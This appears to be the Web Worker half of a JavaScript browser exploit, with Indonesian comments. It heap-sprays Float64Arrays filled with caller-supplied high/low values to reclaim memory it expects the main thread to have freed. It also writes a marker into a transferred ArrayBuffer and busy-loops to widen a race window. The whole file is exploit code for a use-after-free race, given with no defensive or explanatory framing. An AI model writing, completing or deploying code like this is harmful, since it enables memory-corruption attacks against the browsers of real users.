let sprayHoldersWorker = [];

function sprayPayloadWorker(low, high) {
    // Worker melakukan spray untuk menimpa memori di thread-nya
    const SPRAY_COUNT = 1000;
    const PAYLOAD_SIZE = 64; 
    for (let i = 0; i < SPRAY_COUNT; i++) {
        let payloadArray = new Float64Array(PAYLOAD_SIZE);
        payloadArray[0] = high; 
        payloadArray[1] = low;
        sprayHoldersWorker.push(payloadArray); 
    }
}

onmessage = function(e) {
    if (e.data.cmd === 'transfer') {
        const transferredBuffer = e.data.buffer; // Buffer diterima di sini
        
        // Segera setelah menerima buffer, Worker melakukan heap spray di thread-nya
        // Worker berharap memori buffer tersebut sudah di-free di thread utama
        sprayPayloadWorker(e.data.low, e.data.high);
        
        // Akses buffer yang baru diterima untuk menjaga pointer tetap hidup
        // Namun, thread ini akan segera di-terminate oleh thread utama.
        let view = new DataView(transferredBuffer);
        view.setUint32(0, 0xDEADC0DE, true); 
        
        // Memaksa loop untuk menjaga thread sibuk (untuk race yang lebih ketat)
        for(let i = 0; i < 100000; i++) {}
    }
    // Jika cmd === 'setup', worker hanya inisialisasi dan menunggu
};
